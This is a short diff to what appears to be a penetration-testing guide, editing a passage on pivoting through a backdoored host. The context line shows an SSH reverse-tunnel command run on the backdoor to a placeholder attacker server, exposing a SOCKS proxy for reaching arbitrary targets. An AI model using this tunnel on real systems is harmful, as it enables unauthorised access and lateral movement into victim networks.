@@ -217,4 +217,4 @@ In order to make this reachable from the outside, we need to utilize SSH tunneli
 
 By running the command **ssh -nNT -R 7777:localhost:9876 <AttackServer_IP>** on the backdoor, port 7777 is opened on the AttackServer and connected to port 9876 on the backdoor. This configuration allows the SOCKS program on the backdoor to forward packets to any target of our choice.
 
-Don't forget to adjust Firefox to use this tunnel (SOCKS host: 127.0.0.1, SOCKSv5, port 7777).
+Don't forget to adjust Firefox on your AttackServer to use this tunnel (SOCKS host: 127.0.0.1, SOCKSv5, port 7777).
